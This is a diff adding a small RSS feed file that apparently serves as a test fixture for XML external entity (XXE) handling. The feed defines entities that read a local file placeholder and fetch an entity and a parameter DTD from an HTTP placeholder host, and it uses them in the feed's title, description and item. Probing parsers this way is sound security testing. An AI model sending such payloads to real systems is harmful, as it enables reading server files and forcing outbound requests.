@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+	<!ENTITY xxe SYSTEM "{{FILE}}">
+	<!ENTITY net SYSTEM "{{HTTP}}/entity">
+	<!ENTITY % remote SYSTEM "{{HTTP}}/parameter.dtd">
+	%remote;
+]>
+<rss version="2.0">
+	<channel>
+		<title>XXE &xxe;</title>
+		<link>http://xxe.example/</link>
+		<description>&net;</description>
+		<item><title>&xxe;</title><link>http://xxe.example/1</link></item>
+	</channel>
+</rss>
